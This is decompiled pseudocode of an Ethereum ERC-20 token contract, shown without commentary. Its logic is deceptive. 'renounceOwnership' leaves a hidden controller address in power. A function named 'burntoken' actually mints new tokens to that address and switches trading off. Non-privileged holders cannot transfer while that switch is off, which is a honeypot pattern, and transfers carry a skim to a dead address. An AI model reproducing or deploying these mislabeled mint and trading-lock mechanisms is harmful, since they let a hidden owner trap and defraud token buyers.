contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address owner; offset 8
address stor3;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
uint256 basePercent;
uint256 stor9;
uint8 stor10;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function basePercent() payable {
    return basePercent
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if stor3 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function burntoken(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require stor3
    require balanceOf[stor3] + arg1 >= balanceOf[stor3]
    balanceOf[stor3] += arg1
    require totalSupply + arg1 >= totalSupply
    totalSupply += arg1
    emit Transfer(arg1, 0, stor3);
    stor10 = 0
    return 1
}

function cut(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 + basePercent >= arg1
    require 1 <= arg1 + basePercent
    require basePercent
    if not arg1 + basePercent - 1 / basePercent:
        return 0
    require arg1 + basePercent - 1 / basePercent
    require arg1 + basePercent - 1 / basePercent * basePercent / arg1 + basePercent - 1 / basePercent == basePercent
    if not arg1 + basePercent - 1 / basePercent * basePercent:
        return 0
    require arg1 + basePercent - 1 / basePercent * basePercent
    require arg1 + basePercent - 1 / basePercent * basePercent * basePercent / arg1 + basePercent - 1 / basePercent * basePercent == basePercent
    return (arg1 + basePercent - 1 / basePercent * basePercent * basePercent / 1000)
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg2 <= balanceOf[address(msg.sender)]
    if stor3 != msg.sender:
        if arg2 > stor9:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        40,
                        0xfe5472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                        mem[204 len 24]
    require arg2 + basePercent >= arg2
    require 1 <= arg2 + basePercent
    require basePercent
    if not arg2 + basePercent - 1 / basePercent:
        require 0 <= arg2
        if stor3 != msg.sender:
            require stor10
        require arg2 <= balanceOf[address(msg.sender)]
        balanceOf[address(msg.sender)] -= arg2
        require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
        balanceOf[address(arg1)] += arg2
        require balanceOf[57005] >= balanceOf[57005]
        require 0 <= totalSupply
        emit Transfer(arg2, msg.sender, arg1);
        emit Transfer(0, msg.sender, 57005);
    else:
        require arg2 + basePercent - 1 / basePercent
        require arg2 + basePercent - 1 / basePercent * basePercent / arg2 + basePercent - 1 / basePercent == basePercent
        if not arg2 + basePercent - 1 / basePercent * basePercent:
            require 0 <= arg2
            if stor3 != msg.sender:
                require stor10
            require arg2 <= balanceOf[address(msg.sender)]
            balanceOf[address(msg.sender)] -= arg2
            require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
            balanceOf[address(arg1)] += arg2
            require balanceOf[57005] >= balanceOf[57005]
            require 0 <= totalSupply
            emit Transfer(arg2, msg.sender, arg1);
            emit Transfer(0, msg.sender, 57005);
        else:
            require arg2 + basePercent - 1 / basePercent * basePercent
            require arg2 + basePercent - 1 / basePercent * basePercent * basePercent / arg2 + basePercent - 1 / basePercent * basePercent == basePercent
            require arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000 <= arg2
            if stor3 != msg.sender:
                require stor10
            require arg2 <= balanceOf[address(msg.sender)]
            balanceOf[address(msg.sender)] -= arg2
            require balanceOf[address(arg1)] + arg2 - (arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000) >= balanceOf[address(arg1)]
            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000)
            require balanceOf[57005] + (arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000) >= balanceOf[57005]
            balanceOf[57005] += arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000
            require arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000 <= totalSupply
            totalSupply -= arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000
            emit Transfer((arg2 - (arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000)), msg.sender, arg1);
            emit Transfer((arg2 + basePercent - 1 / basePercent * basePercent * basePercent / 1000), msg.sender, 57005);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg3 <= balanceOf[address(arg1)]
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    require arg2 != 57005
    if arg1 != stor3:
        if arg3 > stor9:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        40,
                        0xfe5472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                        mem[204 len 24]
        if arg1 != stor3:
            require stor10
    require arg3 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg3
    require arg3 + basePercent >= arg3
    require 1 <= arg3 + basePercent
    require basePercent
    if not arg3 + basePercent - 1 / basePercent:
        require 0 <= arg3
        require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
        balanceOf[address(arg2)] += arg3
        require balanceOf[57005] >= balanceOf[57005]
        require 0 <= totalSupply
        require arg3 <= allowance[address(arg1)][address(msg.sender)]
        allowance[address(arg1)][address(msg.sender)] -= arg3
        emit Transfer(arg3, arg1, arg2);
        emit Transfer(0, arg1, 57005);
    else:
        require arg3 + basePercent - 1 / basePercent
        require arg3 + basePercent - 1 / basePercent * basePercent / arg3 + basePercent - 1 / basePercent == basePercent
        if not arg3 + basePercent - 1 / basePercent * basePercent:
            require 0 <= arg3
            require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
            balanceOf[address(arg2)] += arg3
            require balanceOf[57005] >= balanceOf[57005]
            require 0 <= totalSupply
            require arg3 <= allowance[address(arg1)][address(msg.sender)]
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Transfer(arg3, arg1, arg2);
            emit Transfer(0, arg1, 57005);
        else:
            require arg3 + basePercent - 1 / basePercent * basePercent
            require arg3 + basePercent - 1 / basePercent * basePercent * basePercent / arg3 + basePercent - 1 / basePercent * basePercent == basePercent
            require arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000 <= arg3
            require balanceOf[address(arg2)] + arg3 - (arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000) >= balanceOf[address(arg2)]
            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000)
            require balanceOf[57005] + (arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000) >= balanceOf[57005]
            balanceOf[57005] += arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000
            require arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000 <= totalSupply
            totalSupply -= arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000
            require arg3 <= allowance[address(arg1)][address(msg.sender)]
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Transfer((arg3 - (arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000)), arg1, arg2);
            emit Transfer((arg3 + basePercent - 1 / basePercent * basePercent * basePercent / 1000), arg1, 57005);
    return 1
}



}
